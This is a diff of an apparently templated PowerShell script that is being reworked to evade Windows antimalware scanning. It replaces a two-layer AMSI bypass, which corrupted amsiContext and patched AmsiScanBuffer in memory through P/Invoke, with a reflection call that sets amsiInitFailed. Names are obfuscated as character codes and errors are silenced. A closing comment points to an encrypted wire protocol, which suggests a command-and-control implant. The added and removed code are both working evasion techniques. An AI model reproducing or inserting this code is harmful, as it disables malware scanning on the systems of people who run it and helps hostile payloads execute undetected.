@@ -8,39 +8,16 @@
 */}}
 $ErrorActionPreference='SilentlyContinue'
 
-# ── AMSI bypass (2-layer) ────────────────────────────────────────────────────
+# ── AMSI bypass ─────────────────────────────────────────────────────────────
 
-# Layer 1: corrupt amsiContext header → AmsiScanBuffer returns E_INVALIDARG
+# Set amsiInitFailed=true via reflection — safe on PS 5.1/.NET 4.x (no native memory writes)
 try {
     $n1=[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115
-    $n2=[char]97+[char]109+[char]115+[char]105+[char]67+[char]111+[char]110+[char]116+[char]101+[char]120+[char]116
+    $n2=[char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100
     $t=[Ref].Assembly.GetType('System.Management.Automation.'+$n1)
-    $p=[Runtime.InteropServices.Marshal]::ReadIntPtr($t.GetField($n2,'NonPublic,Static').GetValue($null))
-    [Runtime.InteropServices.Marshal]::WriteInt32($p,0x80070057)
+    $t.GetField($n2,'NonPublic,Static').SetValue($null,$true)
 } catch {}
 
-# Layer 2: patch AmsiScanBuffer via P/Invoke (Add-Type, strings built at runtime)
-try {
-    $src=@'
-using System;using System.Runtime.InteropServices;using System.Text;
-public class AP{
-    [DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);
-    [DllImport("kernel32")]static extern IntPtr LoadLibrary(string n);
-    [DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
-    public static void Patch(){
-        var lib=Encoding.ASCII.GetString(new byte[]{97,109,115,105,46,100,108,108});
-        var fn=Encoding.ASCII.GetString(new byte[]{65,109,115,105,83,99,97,110,66,117,102,102,101,114});
-        var h=LoadLibrary(lib);if(h==IntPtr.Zero)return;
-        var a=GetProcAddress(h,fn);if(a==IntPtr.Zero)return;
-        uint old;VirtualProtect(a,(UIntPtr)5,0x40,out old);
-        Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,a,3);
-        VirtualProtect(a,(UIntPtr)5,old,out old);
-    }
-}
-'@
-    Add-Type -TypeDefinition $src -Language CSharp 2>$null
-    [AP]::Patch()
-} catch {}
 
 # ── AES-256-CBC + HMAC-SHA256 ────────────────────────────────────────────────
 # Wire format: HMAC(32) + IV(16) + ciphertext — Encrypt-then-MAC
